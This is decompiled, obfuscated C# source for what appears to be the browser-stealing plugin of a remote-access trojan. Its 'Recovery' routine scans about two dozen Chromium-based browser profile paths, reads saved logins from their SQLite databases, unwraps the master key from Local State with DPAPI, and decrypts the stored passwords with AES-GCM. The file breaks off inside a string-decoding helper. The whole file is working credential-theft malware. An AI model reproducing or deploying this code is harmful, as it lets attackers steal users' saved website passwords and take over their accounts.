using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using HsZcU78F13T1yLWI1V;
using UY3BiEArlp6B4GPt9k;

namespace Plugin.Browsers.Chromium;

public class Chromium
{
	public static string LocalApplicationData;

	public static string ApplicationData;

	internal static Chromium oQH3bGPAigOIV0TsobU;

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static StringBuilder Recovery(StringBuilder stringBuilder)
	{
		int num = 2;
		Dictionary<string, string>.Enumerator enumerator2 = default(Dictionary<string, string>.Enumerator);
		KeyValuePair<string, string> current2 = default(KeyValuePair<string, string>);
		List<Account> list = default(List<Account>);
		int num9 = default(int);
		List<Account>.Enumerator enumerator = default(List<Account>.Enumerator);
		int num4 = default(int);
		Account current = default(Account);
		int num6 = default(int);
		while (true)
		{
			int num2 = num;
			do
			{
				IL_0012:
				switch (num2)
				{
				default:
					return stringBuilder;
				case 1:
					try
					{
						while (true)
						{
							IL_0073:
							int num7;
							if (!enumerator2.MoveNext())
							{
								num7 = 1;
								if (hOSumfPOH9XmL1q9SP0() != null)
								{
									num7 = 1;
								}
								goto IL_0046;
							}
							goto IL_0060;
							IL_0060:
							current2 = enumerator2.Current;
							num7 = 3;
							goto IL_0046;
							IL_0046:
							while (true)
							{
								switch (num7)
								{
								case 2:
									break;
								default:
									goto IL_0073;
								case 3:
									list.AddRange(Accounts(current2.Value, current2.Key, (string)VoxFfBPX0t3tEQY5GQe(5488)));
									num7 = 0;
									if (hOSumfPOH9XmL1q9SP0() != null)
									{
										num7 = 0;
									}
									continue;
								case 1:
									goto end_IL_0073;
								}
								break;
							}
							goto IL_0060;
							continue;
							end_IL_0073:
							break;
						}
					}
					finally
					{
						((IDisposable)enumerator2/*cast due to constrained. prefix*/).Dispose();
						int num8 = 0;
						if (!rW22YYPTcT3olKPpw7y())
						{
							num8 = num9;
						}
						switch (num8)
						{
						case 0:
							break;
						}
					}
					break;
				case 2:
					goto IL_0126;
				case 3:
					break;
				case 4:
					try
					{
						while (true)
						{
							IL_076e:
							int num3;
							if (!enumerator.MoveNext())
							{
								num3 = 1;
								if (hOSumfPOH9XmL1q9SP0() != null)
								{
									num3 = num4;
								}
								goto IL_05f5;
							}
							goto IL_061f;
							IL_061f:
							current = enumerator.Current;
							num3 = 7;
							goto IL_05f5;
							IL_05f5:
							while (true)
							{
								switch (num3)
								{
								case 4:
									break;
								case 7:
									x2VFN3P182Znyg825x1(stringBuilder, X5JsOZcv5rIRXCyIseC.IrTxr5idK((string)VoxFfBPX0t3tEQY5GQe(5504), current.URL, (string)VoxFfBPX0t3tEQY5GQe(898), X5JsOZcv5rIRXCyIseC.oD8cEVoyXx), vBZLyocWST46tXrDuXU.qfWcgTWiXM);
									num3 = 1;
									if (rW22YYPTcT3olKPpw7y())
									{
										num3 = 3;
									}
									continue;
								default:
									x2VFN3P182Znyg825x1(stringBuilder, X5JsOZcv5rIRXCyIseC.IrTxr5idK(nCP5vtxT3QjsSeuiK3.xuCtsHmOK(5566), (string)ON5nj1P8OqqwZLbtOuP(current), (string)VoxFfBPX0t3tEQY5GQe(898), X5JsOZcv5rIRXCyIseC.oD8cEVoyXx), vBZLyocWST46tXrDuXU.qfWcgTWiXM);
									num3 = 2;
									if (rW22YYPTcT3olKPpw7y())
									{
										num3 = 6;
									}
									continue;
								case 2:
									x2VFN3P182Znyg825x1(stringBuilder, Nymob3PUyjF9BKEqJqe(VoxFfBPX0t3tEQY5GQe(5542), UxXknUPpWahIvMbH271(current), VoxFfBPX0t3tEQY5GQe(898), X5JsOZcv5rIRXCyIseC.oD8cEVoyXx), vBZLyocWST46tXrDuXU.qfWcgTWiXM);
									num3 = 0;
									if (!rW22YYPTcT3olKPpw7y())
									{
										num3 = 0;
									}
									continue;
								case 3:
									x2VFN3P182Znyg825x1(stringBuilder, Nymob3PUyjF9BKEqJqe(VoxFfBPX0t3tEQY5GQe(5518), PGa56VPwisAetu49Oec(current), VoxFfBPX0t3tEQY5GQe(898), X5JsOZcv5rIRXCyIseC.oD8cEVoyXx), vBZLyocWST46tXrDuXU.qfWcgTWiXM);
									num3 = 2;
									continue;
								case 6:
									x2VFN3P182Znyg825x1(stringBuilder, VoxFfBPX0t3tEQY5GQe(5596), vBZLyocWST46tXrDuXU.qfWcgTWiXM);
									num3 = 5;
									continue;
								case 5:
									goto IL_076e;
								case 1:
									goto end_IL_076e;
								}
								break;
							}
							goto IL_061f;
							continue;
							end_IL_076e:
							break;
						}
					}
					finally
					{
						((IDisposable)enumerator/*cast due to constrained. prefix*/).Dispose();
						int num5 = 0;
						if (hOSumfPOH9XmL1q9SP0() != null)
						{
							num5 = num6;
						}
						switch (num5)
						{
						case 0:
							break;
						}
					}
					goto default;
				}
				enumerator = list.GetEnumerator();
				num2 = 4;
				goto IL_0012;
				IL_0126:
				Dictionary<string, string> obj = new Dictionary<string, string>
				{
					{
						(string)VoxFfBPX0t3tEQY5GQe(3408),
						Dj4213xogb3ONhNxwgn.IrTxr5idK(LocalApplicationData, (string)VoxFfBPX0t3tEQY5GQe(3424), Dj4213xogb3ONhNxwgn.lxIxsGwLmk)
					},
					{
						nCP5vtxT3QjsSeuiK3.xuCtsHmOK(3476),
						(string)yiVB7uPVXy3e6CvqIa9(ApplicationData, VoxFfBPX0t3tEQY5GQe(3490), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					},
					{
						(string)VoxFfBPX0t3tEQY5GQe(3548),
						(string)yiVB7uPVXy3e6CvqIa9(LocalApplicationData, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(3564), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					},
					{
						(string)VoxFfBPX0t3tEQY5GQe(3628),
						(string)yiVB7uPVXy3e6CvqIa9(LocalApplicationData, VoxFfBPX0t3tEQY5GQe(3654), Dj4213xogb3ONhNxwgn.lxIxsGwLmk)
					},
					{
						nCP5vtxT3QjsSeuiK3.xuCtsHmOK(3712),
						(string)yiVB7uPVXy3e6CvqIa9(LocalApplicationData, VoxFfBPX0t3tEQY5GQe(3742), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					},
					{
						(string)VoxFfBPX0t3tEQY5GQe(3792),
						(string)yiVB7uPVXy3e6CvqIa9(LocalApplicationData, VoxFfBPX0t3tEQY5GQe(3812), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					},
					{
						nCP5vtxT3QjsSeuiK3.xuCtsHmOK(3880),
						(string)yiVB7uPVXy3e6CvqIa9(LocalApplicationData, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(3906), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					},
					{
						(string)VoxFfBPX0t3tEQY5GQe(3946),
						Dj4213xogb3ONhNxwgn.IrTxr5idK(LocalApplicationData, (string)VoxFfBPX0t3tEQY5GQe(3976), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					},
					{
						(string)VoxFfBPX0t3tEQY5GQe(4010),
						(string)yiVB7uPVXy3e6CvqIa9(LocalApplicationData, VoxFfBPX0t3tEQY5GQe(4040), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					},
					{
						(string)VoxFfBPX0t3tEQY5GQe(4118),
						(string)yiVB7uPVXy3e6CvqIa9(LocalApplicationData, VoxFfBPX0t3tEQY5GQe(4152), Dj4213xogb3ONhNxwgn.lxIxsGwLmk)
					},
					{
						nCP5vtxT3QjsSeuiK3.xuCtsHmOK(4192),
						(string)yiVB7uPVXy3e6CvqIa9(LocalApplicationData, VoxFfBPX0t3tEQY5GQe(4206), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					},
					{
						nCP5vtxT3QjsSeuiK3.xuCtsHmOK(4252),
						(string)yiVB7uPVXy3e6CvqIa9(LocalApplicationData, VoxFfBPX0t3tEQY5GQe(4266), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					},
					{
						(string)VoxFfBPX0t3tEQY5GQe(4300),
						(string)yiVB7uPVXy3e6CvqIa9(LocalApplicationData, VoxFfBPX0t3tEQY5GQe(4326), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					},
					{
						(string)VoxFfBPX0t3tEQY5GQe(4372),
						Dj4213xogb3ONhNxwgn.IrTxr5idK(LocalApplicationData, (string)VoxFfBPX0t3tEQY5GQe(4388), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					},
					{
						(string)VoxFfBPX0t3tEQY5GQe(4424),
						(string)yiVB7uPVXy3e6CvqIa9(LocalApplicationData, VoxFfBPX0t3tEQY5GQe(4440), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					},
					{
						(string)VoxFfBPX0t3tEQY5GQe(4492),
						(string)yiVB7uPVXy3e6CvqIa9(LocalApplicationData, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(4528), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					},
					{
						nCP5vtxT3QjsSeuiK3.xuCtsHmOK(4584),
						(string)yiVB7uPVXy3e6CvqIa9(LocalApplicationData, VoxFfBPX0t3tEQY5GQe(4628), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					},
					{
						(string)VoxFfBPX0t3tEQY5GQe(4692),
						(string)yiVB7uPVXy3e6CvqIa9(LocalApplicationData, VoxFfBPX0t3tEQY5GQe(4708), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					},
					{
						(string)VoxFfBPX0t3tEQY5GQe(4744),
						(string)yiVB7uPVXy3e6CvqIa9(LocalApplicationData, VoxFfBPX0t3tEQY5GQe(4762), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					},
					{
						(string)VoxFfBPX0t3tEQY5GQe(4800),
						(string)yiVB7uPVXy3e6CvqIa9(LocalApplicationData, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(4818), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					},
					{
						nCP5vtxT3QjsSeuiK3.xuCtsHmOK(4872),
						(string)yiVB7uPVXy3e6CvqIa9(LocalApplicationData, VoxFfBPX0t3tEQY5GQe(4894), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					},
					{
						(string)VoxFfBPX0t3tEQY5GQe(4946),
						(string)yiVB7uPVXy3e6CvqIa9(LocalApplicationData, VoxFfBPX0t3tEQY5GQe(4964), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					},
					{
						nCP5vtxT3QjsSeuiK3.xuCtsHmOK(5002),
						(string)yiVB7uPVXy3e6CvqIa9(ApplicationData, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(5026), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					},
					{
						nCP5vtxT3QjsSeuiK3.xuCtsHmOK(5132),
						(string)yiVB7uPVXy3e6CvqIa9(LocalApplicationData, VoxFfBPX0t3tEQY5GQe(5148), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					},
					{
						nCP5vtxT3QjsSeuiK3.xuCtsHmOK(5212),
						(string)yiVB7uPVXy3e6CvqIa9(LocalApplicationData, VoxFfBPX0t3tEQY5GQe(5228), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					},
					{
						nCP5vtxT3QjsSeuiK3.xuCtsHmOK(5278),
						(string)yiVB7uPVXy3e6CvqIa9(LocalApplicationData, VoxFfBPX0t3tEQY5GQe(5310), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					},
					{
						(string)VoxFfBPX0t3tEQY5GQe(5346),
						Dj4213xogb3ONhNxwgn.IrTxr5idK(LocalApplicationData, (string)VoxFfBPX0t3tEQY5GQe(5366), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					},
					{
						(string)VoxFfBPX0t3tEQY5GQe(5406),
						Dj4213xogb3ONhNxwgn.IrTxr5idK(LocalApplicationData, (string)VoxFfBPX0t3tEQY5GQe(5436), Dj4213xogb3ONhNxwgn.iMfc7WASxZ)
					}
				};
				list = new List<Account>();
				enumerator2 = obj.GetEnumerator();
				num2 = 1;
			}
			while (hOSumfPOH9XmL1q9SP0() == null);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static List<Account> Accounts(object path, object browser, string table = "logins")
	{
		List<string> allProfiles = GetAllProfiles(path);
		List<Account> list = new List<Account>();
		string[] array = allProfiles.ToArray();
		foreach (string text in array)
		{
			if (!fiM4Hw9Fl6DhXSwmaZ.IrTxr5idK(text, fiM4Hw9Fl6DhXSwmaZ.Jh8VdS1qN))
			{
				continue;
			}
			SQLiteHandler sQLiteHandler;
			try
			{
				sQLiteHandler = new SQLiteHandler(text);
			}
			catch (Exception ex)
			{
				LImh5dcp5uP6SL0MSxo.IrTxr5idK(JB4J6pqWfLbCbJXTau.IrTxr5idK(ex, JB4J6pqWfLbCbJXTau.eQVDIKvod), LImh5dcp5uP6SL0MSxo.zATcz7pcpt);
				continue;
			}
			if (!sQLiteHandler.ReadTable(table))
			{
				continue;
			}
			for (int j = 0; j <= sQLiteHandler.GetRowCount() - 1; j++)
			{
				try
				{
					string value = sQLiteHandler.GetValue(j, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(5660));
					string value2 = sQLiteHandler.GetValue(j, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(5684));
					string value3 = sQLiteHandler.GetValue(j, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(5716));
					if (value3 != null)
					{
						if (!v7wC5ZHtrEZ4UbT4Y7d.IrTxr5idK(value3, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(5748), v7wC5ZHtrEZ4UbT4Y7d.ksxHxU45bB) && !v7wC5ZHtrEZ4UbT4Y7d.IrTxr5idK(value3, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(5758), v7wC5ZHtrEZ4UbT4Y7d.ksxHxU45bB))
						{
							value3 = Decrypt(value3);
							goto IL_014f;
						}
						byte[] masterKey = GetMasterKey(JB4J6pqWfLbCbJXTau.IrTxr5idK(fw12lDHKAZL1WqbrafI.IrTxr5idK(HgO8dlHc1YSmPKwNJQn.IrTxr5idK(text, HgO8dlHc1YSmPKwNJQn.i29HHoLMri), fw12lDHKAZL1WqbrafI.od2HQMgwPE), JB4J6pqWfLbCbJXTau.ABdcj1bZp7));
						if (masterKey != null)
						{
							value3 = DecryptWithKey(lvfeUdxdotHleo5TGFR.IrTxr5idK(gRnjGrxKdWbynd12Ef3.IrTxr5idK(gRnjGrxKdWbynd12Ef3.N4xxQnl35W), value3, lvfeUdxdotHleo5TGFR.x5Wxq1S9FF), masterKey);
							goto IL_014f;
						}
					}
					goto end_IL_006a;
					IL_014f:
					if (!fiM4Hw9Fl6DhXSwmaZ.IrTxr5idK(value, fiM4Hw9Fl6DhXSwmaZ.VDjHdVDtH4) && !fiM4Hw9Fl6DhXSwmaZ.IrTxr5idK(value2, fiM4Hw9Fl6DhXSwmaZ.VDjHdVDtH4) && !fiM4Hw9Fl6DhXSwmaZ.IrTxr5idK(value3, fiM4Hw9Fl6DhXSwmaZ.VDjHdVDtH4))
					{
						list.Add(new Account
						{
							URL = value,
							UserName = value2,
							Password = value3,
							Application = (string)browser
						});
					}
					end_IL_006a:;
				}
				catch (Exception ex2)
				{
					LImh5dcp5uP6SL0MSxo.IrTxr5idK(JB4J6pqWfLbCbJXTau.IrTxr5idK(ex2, JB4J6pqWfLbCbJXTau.eQVDIKvod), LImh5dcp5uP6SL0MSxo.zATcz7pcpt);
				}
			}
		}
		return list;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static List<string> GetAllProfiles(object DirectoryPath)
	{
		List<string> list = new List<string>
		{
			Dj4213xogb3ONhNxwgn.IrTxr5idK((string)DirectoryPath, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(5768), Dj4213xogb3ONhNxwgn.lxIxsGwLmk),
			Dj4213xogb3ONhNxwgn.IrTxr5idK((string)DirectoryPath, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(5810), Dj4213xogb3ONhNxwgn.lxIxsGwLmk)
		};
		if (fiM4Hw9Fl6DhXSwmaZ.IrTxr5idK((string)DirectoryPath, fiM4Hw9Fl6DhXSwmaZ.vhxxfQtba8))
		{
			string[] array = y0cvZFcJu5MctIJagut.IrTxr5idK((string)DirectoryPath, y0cvZFcJu5MctIJagut.zSdc3VrRp7);
			foreach (string text in array)
			{
				if (v7wC5ZHtrEZ4UbT4Y7d.IrTxr5idK(text, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(5836), v7wC5ZHtrEZ4UbT4Y7d.rwBHqcql6y))
				{
					list.Add(Dj4213xogb3ONhNxwgn.IrTxr5idK(text, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(5810), Dj4213xogb3ONhNxwgn.lxIxsGwLmk));
				}
			}
		}
		return list;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static string DecryptWithKey(byte[] encryptedData, byte[] MasterKey)
	{
		int num = 2;
		int num2 = num;
		byte[] array = default(byte[]);
		byte[] array3 = default(byte[]);
		byte[] array4 = default(byte[]);
		string result = default(string);
		AesGcm aesGcm = default(AesGcm);
		int num4 = default(int);
		while (true)
		{
			switch (num2)
			{
			case 1:
				jEIqK0ciOAYXZS5sdXD.IrTxr5idK(encryptedData, 3, array, 0, 12, jEIqK0ciOAYXZS5sdXD.CThHDHWTs7);
				num2 = 3;
				continue;
			case 3:
				try
				{
					byte[] array2 = new byte[encryptedData.Length - 15];
					int num3 = 0;
					if (hOSumfPOH9XmL1q9SP0() != null)
					{
						num3 = 0;
					}
					while (true)
					{
						switch (num3)
						{
						case 5:
							sBSy8RPjJSao1EHwiOg(array2, 0, array3, 0, array2.Length - array4.Length, jEIqK0ciOAYXZS5sdXD.CThHDHWTs7);
							num3 = 2;
							continue;
						default:
							jEIqK0ciOAYXZS5sdXD.IrTxr5idK(encryptedData, 15, array2, 0, encryptedData.Length - 15, jEIqK0ciOAYXZS5sdXD.CThHDHWTs7);
							num3 = 3;
							continue;
						case 3:
							array4 = new byte[16];
							num3 = 1;
							if (hOSumfPOH9XmL1q9SP0() == null)
							{
								continue;
							}
							goto IL_006f;
						case 4:
							result = (string)oW0S7QPWCRuFFwWOYHd(Ls2WIgPlao3C2skGNAJ(gRnjGrxKdWbynd12Ef3.EiPHW96iVf), wWVJJGPkQlDS4NKbxUX(aesGcm, MasterKey, array, null, array3, array4), JVKpD1ccnUX1e3koAjr.H34cHR2EZ3);
							num3 = 7;
							if (!rW22YYPTcT3olKPpw7y())
							{
								num3 = 0;
							}
							continue;
						case 2:
							aesGcm = new AesGcm();
							num3 = 4;
							if (rW22YYPTcT3olKPpw7y())
							{
								continue;
							}
							goto IL_006f;
						case 6:
							sBSy8RPjJSao1EHwiOg(array2, array2.Length - 16, array4, 0, 16, jEIqK0ciOAYXZS5sdXD.CThHDHWTs7);
							num3 = 4;
							if (rW22YYPTcT3olKPpw7y())
							{
								num3 = 5;
							}
							continue;
						case 1:
							array3 = new byte[array2.Length - array4.Length];
							num3 = 6;
							continue;
						case 7:
							break;
							IL_006f:
							num3 = num4;
							continue;
						}
						break;
					}
				}
				catch (Exception ex)
				{
					yC7EsnPIUKFe1pLh86n(LpNuNpP2SKCtcVQMYjY(ex, JB4J6pqWfLbCbJXTau.eQVDIKvod), LImh5dcp5uP6SL0MSxo.zATcz7pcpt);
					int num5 = 1;
					if (hOSumfPOH9XmL1q9SP0() != null)
					{
						num5 = 0;
					}
					while (true)
					{
						switch (num5)
						{
						case 1:
							result = null;
							num5 = 0;
							if (rW22YYPTcT3olKPpw7y())
							{
								num5 = 0;
							}
							continue;
						case 0:
							break;
						}
						break;
					}
				}
				break;
			case 2:
				array = new byte[12];
				num2 = 0;
				if (rW22YYPTcT3olKPpw7y())
				{
					num2 = 1;
				}
				continue;
			}
			break;
		}
		return result;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static byte[] GetMasterKey(string LocalStateFolder)
	{
		int num = 4;
		IEnumerator enumerator = default(IEnumerator);
		Match match = default(Match);
		byte[] array = default(byte[]);
		int num4 = default(int);
		int num6 = default(int);
		string text = default(string);
		byte[] result = default(byte[]);
		byte[] array2 = default(byte[]);
		int num8 = default(int);
		int num10 = default(int);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 7:
					try
					{
						while (true)
						{
							IL_011e:
							int num3;
							if (!HrNlFBPS7K2wsUoYmgb(enumerator, WgTYYbJRKwFExGPhGv.HSdcldaZv4))
							{
								num3 = 2;
								goto IL_0063;
							}
							goto IL_0085;
							IL_0063:
							while (true)
							{
								switch (num3)
								{
								case 1:
									break;
								case 5:
									if (!HrNlFBPS7K2wsUoYmgb(match, WgTYYbJRKwFExGPhGv.sfNHafycUh))
									{
										num3 = 0;
										if (!rW22YYPTcT3olKPpw7y())
										{
											num3 = 0;
										}
										continue;
									}
									goto case 3;
								case 3:
									array = (byte[])t0ZjqGPLGysLpN5JBi5(LpNuNpP2SKCtcVQMYjY(YAkQemPCAJkpSYABQ9m(MuRLVOPgn8r9QuTb2SI(match, vTs60yHrNaPomKy60dK.NWuHvxFLNc), 1, vfBAasHEB6dffogKCXX.xUcHYv8OF7), JB4J6pqWfLbCbJXTau.KtrHR9IUdB), okBb41xVk47CJ0uunIs.UErxiqcwf9);
									num3 = 4;
									continue;
								default:
									goto IL_011e;
								case 2:
									goto end_IL_011e;
								}
								break;
							}
							goto IL_0085;
							IL_0085:
							match = (Match)cWZVPgHJvLPLZrWHSSm.IrTxr5idK(enumerator, cWZVPgHJvLPLZrWHSSm.HpDH34NIrO);
							num3 = 5;
							if (!rW22YYPTcT3olKPpw7y())
							{
								num3 = num4;
							}
							goto IL_0063;
							continue;
							end_IL_011e:
							break;
						}
					}
					finally
					{
						IDisposable disposable = enumerator as IDisposable;
						int num5 = 1;
						if (rW22YYPTcT3olKPpw7y())
						{
							num5 = 1;
						}
						while (true)
						{
							switch (num5)
							{
							case 1:
								if (disposable != null)
								{
									num5 = 0;
									if (!rW22YYPTcT3olKPpw7y())
									{
										num5 = num6;
									}
									continue;
								}
								break;
							default:
								k5T4j8P5jO2XXv8imUK(disposable, hp2t4AvvrAe21OV5Ii.BkkmYRwSk);
								num5 = 2;
								continue;
							case 2:
								break;
							}
							break;
						}
					}
					goto case 9;
				case 4:
					text = (string)yiVB7uPVXy3e6CvqIa9(LocalStateFolder, nCP5vtxT3QjsSeuiK3.xuCtsHmOK(5854), Dj4213xogb3ONhNxwgn.lxIxsGwLmk);
					num2 = 3;
					continue;
				case 5:
					return result;
				case 6:
					return null;
				case 8:
					enumerator = j4t0SoHlx89QGykQsZK.IrTxr5idK(ETTxDpPadcHq9Q9nRRO(new Regex((string)VoxFfBPX0t3tEQY5GQe(5882), RegexOptions.Compiled), T3J3iIPYTplRuU7hsoO(text, e48Rc6xALatw3CN0lFC.j65HgVHfeX), ituSE6HG3nGarEfsJox.xpeH8QyJ1g), j4t0SoHlx89QGykQsZK.BprH76MIt8);
					num2 = 7;
					continue;
				default:
					try
					{
						result = (byte[])DrmVBGPEkhyNIrF26o7(array2, null, DataProtectionScope.CurrentUser, muAo9tH2M09galWEihj.dN8HMy4Jr9);
						int num7 = 0;
						if (hOSumfPOH9XmL1q9SP0() != null)
						{
							num7 = num8;
						}
						switch (num7)
						{
						case 0:
							break;
						}
					}
					catch (Exception ex)
					{
						yC7EsnPIUKFe1pLh86n(LpNuNpP2SKCtcVQMYjY(ex, JB4J6pqWfLbCbJXTau.eQVDIKvod), LImh5dcp5uP6SL0MSxo.zATcz7pcpt);
						int num9 = 1;
						if (!rW22YYPTcT3olKPpw7y())
						{
							goto IL_0280;
						}
						goto IL_0284;
						IL_0280:
						num9 = num10;
						goto IL_0284;
						IL_0284:
						while (true)
						{
							switch (num9)
							{
							case 1:
								goto IL_0296;
							case 0:
								break;
							}
							break;
							IL_0296:
							result = null;
							num9 = 0;
							if (hOSumfPOH9XmL1q9SP0() == null)
							{
								continue;
							}
							goto IL_0280;
						}
					}
					goto case 5;
				case 2:
					sBSy8RPjJSao1EHwiOg(array, 5, array2, 0, array.Length - 5, jEIqK0ciOAYXZS5sdXD.CThHDHWTs7);
					num2 = 0;
					if (hOSumfPOH9XmL1q9SP0() != null)
					{
						num2 = 0;
					}
					continue;
				case 3:
					array = new byte[0];
					num2 = 1;
					if (rW22YYPTcT3olKPpw7y())
					{
						continue;
					}
					break;
				case 1:
					if (Gq5sxTPQZGqrjY8Ptn4(text, fiM4Hw9Fl6DhXSwmaZ.Jh8VdS1qN))
					{
						num2 = 8;
						if (hOSumfPOH9XmL1q9SP0() == null)
						{
							continue;
						}
						break;
					}
					goto case 6;
				case 9:
					array2 = new byte[array.Length - 5];
					num2 = 2;
					continue;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static string Decrypt(string encryptedData)
	{
		int num = 4;
		int num2 = num;
		string result = default(string);
		int num4 = default(int);
		int num6 = default(int);
		while (true)
		{
			switch (num2)
			{
			case 1:
				return null;
			case 5:
				num2 = 2;
				break;
			case 2:
				try
				{
					result = (string)oW0S7QPWCRuFFwWOYHd(Ls2WIgPlao3C2skGNAJ(gRnjGrxKdWbynd12Ef3.EiPHW96iVf), DrmVBGPEkhyNIrF26o7(PctqJBP04uBINpliaIZ(Ls2WIgPlao3C2skGNAJ(gRnjGrxKdWbynd12Ef3.N4xxQnl35W), encryptedData, lvfeUdxdotHleo5TGFR.x5Wxq1S9FF), null, DataProtectionScope.CurrentUser, muAo9tH2M09galWEihj.dN8HMy4Jr9), JVKpD1ccnUX1e3koAjr.H34cHR2EZ3);
					int num3 = 0;
					if (hOSumfPOH9XmL1q9SP0() != null)
					{
						num3 = num4;
					}
					switch (num3)
					{
					case 0:
						break;
					}
				}
				catch (Exception ex)
				{
					yC7EsnPIUKFe1pLh86n(LpNuNpP2SKCtcVQMYjY(ex, JB4J6pqWfLbCbJXTau.eQVDIKvod), LImh5dcp5uP6SL0MSxo.zATcz7pcpt);
					int num5 = 0;
					if (rW22YYPTcT3olKPpw7y())
					{
						num5 = 0;
					}
					while (true)
					{
						switch (num5)
						{
						default:
							result = null;
							num5 = 1;
							if (!rW22YYPTcT3olKPpw7y())
							{
								num5 = num6;
							}
							continue;
						case 1:
							break;
						}
						break;
					}
				}
				goto default;
			default:
				return result;
			case 3:
				if (XTWcJhPxGrVWijEjsVK(encryptedData, ufQl9lHBULVUQ1TPAER.KMoH0v8QYE) != 0)
				{
					num2 = 5;
					break;
				}
				goto case 1;
			case 4:
				if (encryptedData != null)
				{
					num2 = 3;
					break;
				}
				goto case 1;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private string[] GetAppDataFolders()
	{
		int num = 5;
		List<string> list = default(List<string>);
		DirectoryInfo directoryInfo = default(DirectoryInfo);
		int num3 = default(int);
		string[] array = default(string[]);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 8:
					list.Add(LB83YvHblAbkTcy3hlK.IrTxr5idK((string)T3J3iIPYTplRuU7hsoO(teRMNHPeCG99YV5cyxt(xhf0UNcTnQ6uV2PN1fR.IvQHZrCF4Q), e48Rc6xALatw3CN0lFC.tkRHUKqDTt), nCP5vtxT3QjsSeuiK3.xuCtsHmOK(5932), (string)LpNuNpP2SKCtcVQMYjY(directoryInfo, JB4J6pqWfLbCbJXTau.TnEHjBkgsH), (string)VoxFfBPX0t3tEQY5GQe(5954), LB83YvHblAbkTcy3hlK.RKyHNfaSZa));
					num = 7;
					break;
				case 7:
					num3++;
					num2 = 6;
					continue;
				case 5:
					list = new List<string>();
					num2 = 4;
					continue;
				case 3:
				case 6:
					if (num3 >= array.Length)
					{
						num2 = 1;
						if (rW22YYPTcT3olKPpw7y())
						{
							continue;
						}
						break;
					}
					goto default;
				default:
					directoryInfo = new DirectoryInfo(array[num3]);
					num = 8;
					break;
				case 2:
					num3 = 0;
					num2 = 3;
					if (rW22YYPTcT3olKPpw7y())
					{
						continue;
					}
					break;
				case 1:
					return (string[])J0Z1qkPsKM6q52QYrbN(list);
				case 4:
					array = c7RmXJHujJfsPgEQDue.IrTxr5idK(Dj4213xogb3ONhNxwgn.IrTxr5idK((string)T3J3iIPYTplRuU7hsoO(xhf0UNcTnQ6uV2PN1fR.IrTxr5idK(xhf0UNcTnQ6uV2PN1fR.IvQHZrCF4Q), e48Rc6xALatw3CN0lFC.tkRHUKqDTt), (string)VoxFfBPX0t3tEQY5GQe(5932), Dj4213xogb3ONhNxwgn.lxIxsGwLmk), (string)VoxFfBPX0t3tEQY5GQe(5948), SearchOption.TopDirectoryOnly, c7RmXJHujJfsPgEQDue.p2mHPNl0dT);
					num = 2;
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public Chromium()
	{
		gevT3nPtg94dR1yDmjb();
		base._002Ector();
		int num = 0;
		if (1 == 0)
		{
			int num2;
			num = num2;
		}
		switch (num)
		{
		case 0:
			break;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	static Chromium()
	{
		int num = 2;
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				default:
					return;
				case 0:
					return;
				case 1:
					LocalApplicationData = (string)h6tDTePF2jW9WmPQnvP(Environment.SpecialFolder.LocalApplicationData);
					num2 = 3;
					continue;
				case 3:
					ApplicationData = (string)h6tDTePF2jW9WmPQnvP(Environment.SpecialFolder.ApplicationData);
					num2 = 0;
					if (true)
					{
						continue;
					}
					break;
				case 2:
					gevT3nPtg94dR1yDmjb();
					num2 = 1;
					if (true)
					{
						continue;
					}
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object VoxFfBPX0t3tEQY5GQe(int P_0)
	{
